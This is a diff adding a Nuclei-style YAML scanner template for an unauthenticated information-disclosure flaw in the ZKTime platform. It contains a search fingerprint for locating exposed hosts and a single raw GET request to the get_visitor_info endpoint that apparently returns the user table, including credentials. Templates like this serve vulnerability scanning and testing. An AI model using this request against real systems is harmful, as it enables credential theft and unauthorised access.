@@ -1,0 +1,24 @@
+id: ZkTime-get_visitor_info-Information-disclosure
+
+info:
+  name: "ZKTime 时间精细化管理平台 get_visitor_info 接口信息泄露"
+  author: HuanXiong
+  severity: medium
+  description: |-
+    Hunter: body="/media/img/login/zktime_logo_zh-cn.png" && body="/iclock/imanager"
+    ZKTime 时间精细化管理平台 get_visitor_info 存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，从而登录后台，使系统处于极不安全的状态。
+  reference:
+    - 
+  tags: ZKTime
+
+http:
+  - raw:
+      - |
+        GET /api/get_visitor_info?table=userinfo HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: 信息泄露
+        dsl:
+          - 'status_code==200 && contains_all(header,"text/plain")'
